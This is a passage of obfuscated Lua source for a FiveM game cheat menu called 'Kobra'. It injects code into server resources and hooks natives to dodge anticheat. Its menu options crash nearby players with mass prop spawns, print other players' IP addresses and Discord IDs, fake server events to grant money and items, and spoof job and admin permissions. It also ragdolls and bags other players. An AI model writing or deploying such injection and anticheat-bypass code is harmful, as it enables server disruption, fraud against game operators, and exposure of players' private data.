                        return "null"
                    else
                        return "\"[unserializable:" .. type(value) .. "]\""
                    end
                end

                local function HookNative(nativeName, newFunction)
                    local original = _G[nativeName]
                    if original and type(original) == "function" then
                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(original, ...)
                        end
                    end
                end

                local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                HookNative(te, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)

                HookNative(tse, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)
            ]];v624=1 + 1 ;end if (v624==(1028 -(263 + 763))) then v48(v625,v627);MachoMenuNotification("Injector","Hooks injected into ^3"   .. v625   .. "^7 successfully!" );v12:ShowUI();break;end if (v624==(0 + 0)) then v12:HideUI();v625=nil;v626=false;v59("Resource Name","",function(v1008) if (v1008 and (v1008~="")) then v625=v1008;end v626=true;end,"typeable");v624=859 -(649 + 209) ;end end end});end if (GetResourceState("ox_lib")=="started") then v96({type="button",label="CRASH NEARBY PLAYERS",onSelect=function() local v628=0;while true do if (v628==0) then if (GetResourceState("WaveShield")=="started") then local v1054=0;while true do if (v1054==0) then v12:Notify("error","Kobra","Bahama Prevention: Can't use this on WaveShit",3000);return;end end end MachoInjectResourceRaw("ox_lib",[[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
        ]]);break;end end end});end if ((GetResourceState("dpemotes")=="started") or (GetResourceState("framework")=="started")) then v96({type="button",label="BRING NEARBY PLAYERS",onSelect=function() local v629=0 -0 ;while true do if (v629==0) then v12:Notify("success","Kobra","Attempting to bring all players",3000);MachoInjectThread(731 -(643 + 88) ,"dpemotes","",[[
                    TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")
                ]]);break;end end end});end if (GetResourceState("mc9-adminmenu")=="started") then v96({type="button",label="ADMIN MENU (F8)",onSelect=function() local v630=0;while true do if ((1769 -(54 + 1715))==v630) then v12:Notify("success","Kobra","Admin Menu List",3000);MachoInjectResource2(NewThreadNs,"mc9-adminmenu",[[
                for id, ply in pairs(CurrentPlayers or {}) do
                    if ply and ply.name and ply.id then
                        print(("Information about ^6%s ^7| ^2%s"):format(ply.name, ply.id))
                        
                        if ply.identifiers and ply.identifiers.ip then
                            print(("    IP: ^2%s"):format(ply.identifiers.ip:sub(4)))
                        else
                            print("    IP: ^1Not Available")
                        end
                        
                        if ply.identifiers and ply.identifiers.discord then
                            print(("    Discord: ^2%s"):format(ply.identifiers.discord:sub(9)))
                        else
                            print("    Discord: ^1Not Available")
                        end
                    end
                end
            ]]);break;end end end});end if (GetResourceState("mc9-mainmenu")=="started") then v96({type="button",label="MCSHIT9 ADD ITEMS",onSelect=function() local v631=0 -0 ;while true do if (v631==(0 -0)) then v12:Notify("success","Kobra","Spawning Items",6127 -3127 );MachoInjectResource2(NewThreadNs,"mc9-mainmenu",[[
            local data, playtime = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
            for i,v in pairs(data) do
                local result, message = mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v)
            end
            ]]);break;end end end});end if (GetResourceState("vMenu")=="started") then v96({type="button",label="HIT DMS",onSelect=function() local v632=0;while true do if (v632==0) then v12:Notify("success","Kobra","Message Sent",2410 + 590 );MachoInjectResource2(1 + 0 ,"any",[[
                    TriggerServerEvent('vMenu:SendMessageToPlayer', -1, 'Hello this is Kobra Menu by JayThaaGamer, the leading cheat in the market.')
                ]]);break;end end end});end if (GetResourceState("amigo")=="started") then v96({type="button",label="ADD ITEM (1)",onSelect=function() v12:HideUI();local function v633(v725,v726) local v727=0 -0 ;local v728;local v729;while true do if (v727==(1385 -(132 + 1251))) then return v728;end if ((1 + 0)==v727) then v59(v725,v726 or "" ,function(v1055) local v1056=0 -0 ;while true do if (v1056==(0 + 0)) then v728=v1055;v729=true;break;end end end,"typeable");while  not v729 do Wait(458 -(185 + 273) );end v727=2;end if (v727==0) then v728=nil;v729=false;v727=1 + 0 ;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");local v634=v633("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v634));if ( not v634 or (v634=="")) then local v822=0 -0 ;while true do if ((1 + 0)==v822) then v12:ShowUI();return;end if (v822==0) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",3000);v822=1225 -(361 + 863) ;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");local v635=v633("Item Count","1");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v635));local v636=tonumber(v635);if ( not v636 or (v636<(2 -1))) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v636=1;end if (v636>(101327 -(443 + 884))) then local v823=0 -0 ;while true do if (v823==(0 + 0)) then print("^7[^5Kobra^7] [^1WARN^7]: Count too high, clamping to 100000");v636=140760 -40760 ;break;end end end v634=tostring(v634 or "" );v636=tonumber(v636 or (1 + 0) );print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v634);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v636);local v637,v638=pcall(function() MachoInjectResourceRaw("amigo",string.format([[
                        -- Hook native functions safely
                        local function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            _G[nativeName] = function(...)
                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %%s"):format(nativeName))
                                return newFunction(originalNative, ...)
                            end
                        end

                        HookNative("TriggerEvent", function(originalFn, ...) return originalFn(...) end)
                        HookNative("TriggerServerEvent", function(originalFn, ...) return originalFn(...) end)

                        _G.Kobra = {
                            TEvent = function(eName, ...) return TriggerEvent(eName, ...) end,
                            TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end,
                        }

                        print("^7[^5Kobra^7] [^3DEBUG^7]: Sending giveItem request for %s x%d")
                        _G.Kobra.TSEvent('player:giveItem', { item = "%s", count = %d })
                    ]],v634,v636,v634,v636));end);if  not v637 then local v824=0 + 0 ;while true do if (v824==0) then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v638);print("^7[^5Kobra^7] [^3DEBUG^7]: itemName =",tostring(v634),"itemCount =",tostring(v636));v824=1;end if ((2 -1)==v824) then v12:Notify("error","Kobra","String format failed — check console",4747 -(16 + 731) );break;end end else print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");end v12:ShowUI();end});end local v298=GetResourceState("scripts")=="started" ;local v299=GetResourceState("framework")=="started" ;if (v298 or v299) then local v583=0;local v584;while true do if (v583==(0 + 0)) then v584=(v298 and "scripts") or "framework" ;v96({type="button",label="COMPLETE COMMS",onSelect=function() local v901=0 + 0 ;while true do if (v901==(0 + 0)) then v12:Notify("Comserv","Kobra","Action Removed you might have to spam this",3000);MachoInjectResourceRaw(v584,[[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end

                    local function g(n) return _G[decode(n)] end

                    for i = 1, 1 do
                        lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                        g({87,97,105,116})(0)
                    end
                ]]);break;end end end});break;end end end if ((GetResourceState("es_extended")=="started") or (GetResourceState("core")=="started")) then v96({type="button",label="POLICE JOB (1)",onSelect=function() if (GetResourceState("es_extended")=="started") then local v825=760 -(527 + 233) ;while true do if (v825==(0 + 0)) then v12:Notify("Setjob","Kobra","Your job has been set to police",6834 -3834 );MachoInjectResource2(NewThreadNs,"es_extended",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);break;end end elseif (GetResourceState("core")=="started") then local v1009=0 + 0 ;while true do if (v1009==(1785 -(1107 + 678))) then v12:Notify("Setjob","Kobra","Your job has been set to police",3000);MachoInjectResource2(NewThreadNs,"core",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);break;end end else print("Neither core nor es_extended started");end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v96({type="button",label="POLICE JOB (2)",onSelect=function() v12:Notify("Setjob","Kobra","You are now Police",2464 + 536 );MachoInjectResourceRaw("any",[[
                    local lp = LocalPlayer
                    if lp and lp.state then
                        lp.state:set("job", {
                            name = "police",
                            label = "Police",
                            grade = 4,
                            grade_name = "sergeant"
                        }, true)
                        print("[✅] Job set to police successfully.")
                    else
                        print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                    end
                ]]);end});end if (GetResourceState("codewave-sneaker-phone")=="started") then v96({type="button",label="COLLECT REWARDS",onSelect=function() MachoInjectResource2(NewThreadNs,"codewave-sneaker-phone",[[
                    function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("TriggerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    HookNative("TriggerServerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    _G.Kobra = {
                        TEvent = function(eName, ...)
                            return TriggerEvent(eName, ...)
                        end,
                        TSEvent = function(eName, ...)
                            return TriggerServerEvent(eName, ...)
                        end,
                    }

                    _G.Kobra.TSEvent('delivery:giveRewardShoes', 100000)
                    print("[✅] reward triggered successfully.")
                ]]);end});end if (GetResourceState("rzrp-base")=="started") then v96({type="checkbox",label="Ragdoll Players (RZRP)",checked=false,onSelect=function(v639) if v639 then local v826=0;while true do if ((0 + 0)==v826) then v12:Notify("Ragdoll","Kobra","Ragdolling Nearby Players",4050 -(4 + 46) );v48("rzrp-base",[[
                        if not _G.KobraRagdollPlayersInitialized then
                            _G.KobraRagdollPlayersEnabled = true
                            _G.KobraRagdollPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            -- Stop any existing ragdoll thread before creating a new one
                            if _G.KobraRagdollThread then
                                TerminateThread(_G.KobraRagdollThread)
                                _G.KobraRagdollThread = nil
                            end

                            _G.KobraRagdollThread = SafeThread(function()
                                while _G.KobraRagdollPlayersEnabled and _G.KobraRagdollPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 30000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:Slap', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraRagdollThread = nil
                            end)
                        else
                            _G.KobraRagdollPlayersEnabled = true
                        end
                    ]]);break;end end else local v827=0 -0 ;while true do if (v827==(0 -0)) then v12:Notify("Ragdoll","Kobra","Stopped Ragdolling Players",4000);v48("rzrp-base",[[
                        _G.KobraRagdollPlayersEnabled = false
                        _G.KobraRagdollPlayersInitialized = false
                        if _G.KobraRagdollThread then
                            TerminateThread(_G.KobraRagdollThread)
                            _G.KobraRagdollThread = nil
                        end
                    ]]);break;end end end end});end if (GetResourceState("rzrp-base")=="started") then v96({type="checkbox",label="Bag Closest Players (RZRP)",checked=false,onSelect=function(v640) if v640 then print("Bag Closest Players Started...");v48("rzrp-base",[[
                        if not _G.KobraBagPlayersInitialized then
                            _G.KobraBagPlayersEnabled = true
                            _G.KobraBagPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            if _G.KobraBagThread then
                                TerminateThread(_G.KobraBagThread)
                                _G.KobraBagThread = nil
                            end

                            _G.KobraBagThread = SafeThread(function()
                                while _G.KobraBagPlayersEnabled and _G.KobraBagPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 300000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:BagClosestPlayer', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraBagThread = nil
                            end)
                        else
                            _G.KobraBagPlayersEnabled = true
                        end
                    ]]);else local v828=0 + 0 ;while true do if (v828==(0 -0)) then print("Bag Closest Players Stopped...");v48("rzrp-base",[[
                        _G.KobraBagPlayersEnabled = false
                        _G.KobraBagPlayersInitialized = false
                        if _G.KobraBagThread then
                            TerminateThread(_G.KobraBagThread)
                            _G.KobraBagThread = nil
                        end
                    ]]);break;end end end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v96({type="button",label="Force Gang",onSelect=function() local v641=0 -0 ;local v642;local v643;local v644;local v645;while true do if (v641==(1398 -(1262 + 134))) then v645=string.format([[
                    LocalPlayer.state:set("gang", "%s", true)
                    LocalPlayer.state:set("gang_rank", %d, true)
                ]],v642,v643);v48(v644,v645);v12:ShowUI();v12:Notify("success","Kobra","Gang Set",4000);break;end if (v641==(0 -0)) then v642="";v643=1 + 0 ;v12:HideUI();v59("Gang Name","",function(v1010) if (v1010 and (v1010~="")) then v642=v1010;end end,"typeable");v641=1;end if (v641==(1 + 0)) then Wait(3095 -(383 + 412) );v59("Gang Rank","",function(v1011) if (v1011 and (v1011~="")) then v643=tonumber(v1011) or (1 + 0) ;end end,"typeable");Wait(1000);v644=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;v641=1 + 1 ;end end end});end if (GetResourceState("framework")=="started") then v96({type="button",label="Give Item #2",onSelect=function() v12:HideUI();local function v646(v730,v731) local v732=0;local v733;local v734;while true do if (v732==2) then return v733;end if (v732==0) then v733=nil;v734=false;v732=1;end if (v732==1) then v59(v730,v731 or "" ,function(v1057) local v1058=0;while true do if (v1058==(0 + 0)) then v733=v1057;v734=true;break;end end end,"typeable");while  not v734 do Wait(0 + 0 );end v732=2;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");local v647=v646("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v647));if ( not v647 or (v647=="")) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",2945 + 55 );v12:ShowUI();return;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");local v648=v646("Item Count","1");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v648));local v649=tonumber(v648);if ( not v649 or (v649<(1 -0))) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v649=1 + 0 ;end if (v649>(293662 -193662)) then local v829=0;while true do if (v829==(0 -0)) then print("^7[^5Kobra^7] [^1WARN^7]: That shit too high, stamping to 100000");v649=100000;break;end end end v647=tostring(v647 or "" );v649=tonumber(v649 or (2 -1) );print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v647);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v649);local v650,v651=pcall(function() MachoInjectResourceRaw("framework",string.format([[
                        TriggerServerEvent('drugs:receive', {
                            Reward = {
                                Name = "%s",
                                Amount = %d
                            }
                        })
                    ]],v647,v649));end);if  not v650 then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v651);v12:Notify("error","Kobra","String format failed — check console",1110 + 2890 );else local v830=707 -(667 + 40) ;while true do if (v830==0) then print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");v12:Notify("success","Kobra","Item Sent",5310 -(436 + 874) );break;end end end v12:ShowUI();end});end if (GetResourceState("WayTooCerti_3D_Printer")=="started") then v96({type="button",label="COLLECT ITEMS 3",onSelect=function() MachoInjectResourceRaw("WayTooCerti_3D_Printer",[[
                local function Ak47Spawn()
                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)
                end
                Ak47Spawn()
            ]]);end});end if (GetResourceState("tm-base")=="started") then table.insert(events,{name="Spawn Money #4",eventName="give_metro_money_04",execute=function() local v652=1606 -(762 + 844) ;while true do if ((0 -0)==v652) then print("Give Money Metro RP...");MachoInjectResource2(NewThreadNs,"tm-base",[[
                TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)
                ]]);break;end end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v96({type="button",label="Set Chat Tag",onSelect=function() v12:HideUI();local function v653(v735,v736) local v737=0;local v738;local v739;while true do if (v737==1) then v59(v735,v736 or "" ,function(v1059) local v1060=0;while true do if ((0 -0)==v1060) then v738=v1059;v739=true;break;end end end,"typeable");while  not v739 do Wait(0 + 0 );end v737=1 + 1 ;end if (v737==2) then return v738;end if (v737==(476 -(209 + 267))) then v738=nil;v739=false;v737=1 -0 ;end end end local v654=v653("Chat Tag Name","");if ( not v654 or (v654=="")) then local v831=0 -0 ;while true do if (v831==(1711 -(1611 + 100))) then v12:ShowUI();return;end end end Wait(379 + 121 );local v655=v653("Tag Color (R, G, B)","0, 255, 0");if ( not v655 or (v655=="")) then v655="255, 255, 255";end Wait(1284 -(14 + 770) );local v656=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;MachoInjectResourceRaw(v656,string.format([[
                    LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
                ]],v654,v655));v12:ShowUI();end});end if (GetResourceState("wasabi_multijob")=="started") then v96({type="button",label="POLICE JOB (3)",onSelect=function() local v657=1784 -(1165 + 619) ;while true do if (v657==(0 -0)) then MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
        ]]);break;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v96({type="button",label="EMS JOB (1)",onSelect=function() MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
            CheckJob(job, true)
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
        ]]);end});end if (GetResourceState("ElectronAC")=="started") then v96({type="button",label="ElectronAC Admin Panel",onSelect=function() MachoInjectResourceRaw("ElectronAC",[[
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = "menu",
            data = {
                info = {
                    adminContext = {
                        master = true,
                        permissions = { "all" }
                    },
                    identifiers = {
                        ["ip"] = "127.0.0.1",
                        ["license"] = "",
                        ["license2"] = "",
                    },
                    permissions = {
                        adminMenu = true,
                        whitelisted = true
                    }
                },
                open = true,
                setOpen = true
            }
        })
        ]]);end});end if (GetResourceState("spoodyFraud")=="started") then v96({type="button",label="Collect Cash",onSelect=function() MachoInjectResource2(NewThreadNs,"spoodyFraud",[[
        function HookNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        HookNative("CreateThread", function(originalFn, ...)
            return originalFn(...)
        end)

        HookNative("TriggerServerEvent", function(originalFn, ...)
            return originalFn(...)
        end)

        function Spoody()
            for i = 1, 30 do
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

                Citizen.Wait(5)

                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
            end
        end

        CreateThread(function()
            Spoody()
        end)
        ]]);end});end v59("Choose Menu Key","",function(v504) for v585,v586 in pairs(v44) do if (v586:lower()==v504:lower()) then v23=v586;Wait(631 -(229 + 152) );v12:ShowUI();return;end end end,"keybind");local v300=0;local v301=314 -(107 + 87) ;while true do Wait(0 -0 );if v32 then local v658=v38[v39];if IsControlJustReleased(0 + 0 ,11 + 3 ) then local v832=0 -0 ;while true do if (v832==0) then v39=(v39% #v38) + (3 -2) ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="down"}));break;end end end if IsControlJustReleased(0 + 0 ,29 -(13 + 1) ) then local v833=0 + 0 ;while true do if ((0 + 0)==v833) then v39=((v39-(1060 -(987 + 71)))% #v38) + 1 ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="up"}));break;end end end if (v658=="Shoot Weapon") then local v834=0 -0 ;while true do if (v834==(0 -0)) then if IsDisabledControlJustPressed(699 -(514 + 185) ,6 + 38 ) then v34=((v34-(3 -1))% #v36) + (3 -2) ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));end if IsDisabledControlJustPressed(1504 -(771 + 733) ,76 -38 ) then local v1176=0 -0 ;while true do if (v1176==(1167 -(407 + 760))) then v34=(v34% #v36) + 1 + 0 ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));break;end end end break;end end elseif (v658=="Spawn Car") then local v1012=0 + 0 ;while true do if (v1012==0) then if IsDisabledControlJustPressed(0,34 + 10 ) then local v1288=1854 -(169 + 1685) ;while true do if (v1288==(0 + 0)) then v35=((v35-(393 -(41 + 350)))% #v37) + 1 ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));break;end end end if IsDisabledControlJustPressed(0 -0 ,107 -69 ) then local v1289=0 -0 ;while true do if (v1289==(0 -0)) then v35=(v35% #v37) + 1 + 0 ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));break;end end end break;end end end if IsDisabledControlPressed(887 -(790 + 97) ,109 -85 ) then local v835=v658;if (v835=="Shoot Weapon") then local v1013=v36[v34];if (v1013=="WEAPON_PERMKILL") then v1013="WEAPON_TRANQUILIZER";elseif (v1013=="WEAPON_RPG_2") then v1013="WEAPON_AIRSTRIKE_ROCKET";end if (v1013~=v33) then v33=v1013;print(("weapon: %s, LastWeaponFired: %s"):format(v1013,v33));if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1442=0;local v1443;local v1444;local v1445;local v1446;local v1447;local v1448;local v1449;local v1450;local v1451;local v1452;while true do if (v1442==3) then v1444=GetCamCoord(_G.KobraFreecamObject);v1445=GetCamRot(_G.KobraFreecamObject,1 + 1 );v1446=v1443(v1445);v1447=339 + 661 ;v1442=249 -(235 + 10) ;end if (v1442==4) then v1448=v1444 + (v1446 * v1447) ;v1449=PlayerPedId();v1450=GetHashKey(v1013);v1451=nil;v1442=4 + 1 ;end if (v1442==(1 -0)) then hNative("Wait",function(v1616,...) return v1616(...);end);hNative("PlayerPedId",function(v1617,...) return v1617(...);end);hNative("GetHashKey",function(v1618,...) return v1618(...);end);hNative("GiveWeaponToPed",function(v1619,...) return v1619(...);end);v1442=2;end if (v1442==(1183 -(887 + 296))) then v1443=nil;function v1443(v1620) local v1621=1045 -(512 + 533) ;local v1622;local v1623;local v1624;while true do if (v1621==(1425 -(662 + 762))) then v1624=math.abs(math.cos(v1623));return vector3( -math.sin(v1622) * v1624 ,math.cos(v1622) * v1624 ,math.sin(v1623));end if (v1621==(677 -(334 + 343))) then v1622=math.rad(v1620.z);v1623=math.rad(v1620.x);v1621=3 -2 ;end end end function hNative(v1625,v1626) local v1627=489 -(198 + 291) ;local v1628;while true do if (v1627==(0 + 0)) then v1628=_G[v1625];if ( not v1628 or (type(v1628)~="function")) then return;end v1627=575 -(141 + 433) ;end if (v1627==1) then _G[v1625]=function(...) return v1626(v1628,...);end;break;end end end hNative("CreateThread",function(v1629,...) return v1629(...);end);v1442=1;end if (v1442==(23 -18)) then function v1451(v1630) local v1631=0 + 0 ;local v1632;while true do if (v1631==(778 -(227 + 550))) then return table.concat(v1632,",");end if ((0 -0)==v1631) then v1632={};for v1719=1, #v1630 do v1632[v1719]=string.byte(v1630,v1719);end v1631=2 -1 ;end end end v1452=v1451(v1013);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
